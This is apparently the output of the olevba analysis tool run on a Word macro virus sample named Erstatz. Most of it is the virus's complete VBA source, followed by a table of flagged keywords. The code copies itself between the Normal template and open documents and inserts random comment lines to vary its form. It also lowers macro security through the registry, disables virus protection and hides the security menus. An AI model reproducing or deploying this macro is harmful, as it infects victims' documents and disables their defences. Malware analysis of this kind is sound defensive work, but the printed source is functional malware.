olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Erstatz-b5b8132a0400b8705afeafd7be6bb52bda461ea0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Erstatz-b5b8132a0400b8705afeafd7be6bb52bda461ea0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()
'
'Erstatz v1.0
On Error Resume Next
GoTo setup
infekt:
Set nrmal = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set aktiv = ActiveDocument.VBProject.VBComponents(1).CodeModule
If nrmal.lines(2, 1) <> "'" Then
nrmal.deletelines 1, nrmal.countoflines
'
nrmal.insertlines 2, aktiv.lines(2, aktiv.countoflines)
nrmal.insertlines 1, "Sub Document_Close()"
'
For n = 9 To nrmal.countoflines
Randomize
ma = Int((Rnd * 4) + 1)
'
If nrmal.lines(n, 1) = "'" And ma >= 2 Then
nrmal.deletelines n, 1
'
'
'
je = je + 1
If je = 15 Then GoTo ausgang
'
End If
Next n
End If
'
'
ausgang:
'
'
'
If aktiv.lines(2, 1) <> "'" Then
'
'
'
'
aktiv.deletelines 1, aktiv.countoflines
aktiv.insertlines 2, nrmal.lines(2, nrmal.countoflines)
aktiv.insertlines 1, "Sub Document_Open()"
For i = 9 To aktiv.countoflines
Randomize
ma = Int((Rnd * 4) + 1)
If ma <= 2 Then
aktiv.insertlines i, "'"
End If
Next i
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, fileformat:=wdFormatDocument
End If
GoTo done
setup:
Options.SaveNormalPrompt = False
Options.SendMailAttach = True
Options.ConfirmConversions = False
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
Options.VirusProtection = False
End If
GoTo infekt:
done:
End Sub
        




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
